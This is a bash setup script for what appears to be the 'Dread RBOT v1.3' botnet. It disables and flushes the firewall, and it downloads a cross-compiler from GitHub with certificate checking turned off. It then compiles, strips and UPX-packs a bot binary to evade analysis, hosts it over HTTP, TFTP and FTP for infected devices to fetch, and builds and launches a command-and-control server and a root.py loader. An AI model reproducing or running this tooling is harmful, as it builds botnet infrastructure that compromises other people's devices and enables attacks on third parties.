#!/bin/bash


yum install nano screen gcc perl wget bzip2 php python3 -y

service httpd restart
service iptables stop
iptables -F

mkdir /etc/xcompile
cd /etc/xcompile 
wget https://github.com/OmiShift121/myfirstrepo/raw/refs/heads/main/cross-compiler-i586.tar.bz2 --no-check-certificate

tar -jxf cross-compiler-i586.tar.bz2
rm -rf cross-compiler-i586.tar.bz2
mv cross-compiler-i586 i586
cd "/home/centos/Dread-v1.3/Dread-RBOT-v1.3-main/Dread v1.3/"

#add compiler to path (yes we only need the one)
export PATH=$PATH:/etc/xcompile/i586/bin

function compile_bot {
    "$1-gcc" $3 main/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DDREAD_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}

mkdir release
compile_bot i586 rbot "-static"

mkdir /var/www/html/botpilled
mv "/home/centos/Dread-v1.3/Dread-RBOT-v1.3-main/Dread v1.3/release/rbot" /var/www/html/botpilled

rm -rf release

yum install httpd -y; service httpd start; yum install xinetd tftp-server -y; yum install vsftpd -y; service vsftpd start

service httpd restart
service xinetd restart

ulimit -n 999999

gcc cnc.c -o cnc -pthread

mv "/home/centos/Dread-v1.3/Dread-RBOT-v1.3-main/Dread v1.3/tools/iptool.php" /var/www/html

mv "/home/centos/Dread-v1.3/Dread-RBOT-v1.3-main/Dread v1.3/tools/upx" "/home/centos/Dread-v1.3/Dread-RBOT-v1.3-main/Dread v1.3/"
chmod +x upx
./upx --ultra-brute /var/www/html/botpilled/*
rm -rf upx
mv "/home/centos/Dread-v1.3/Dread-RBOT-v1.3-main/Dread v1.3/tools/root.py" "/home/centos/Dread-v1.3/Dread-RBOT-v1.3-main/Dread v1.3/"
rm -rf tools
#build is now complete

iptables -F

clear
#no need for .sh bins to overcomplicate this
python3 root.py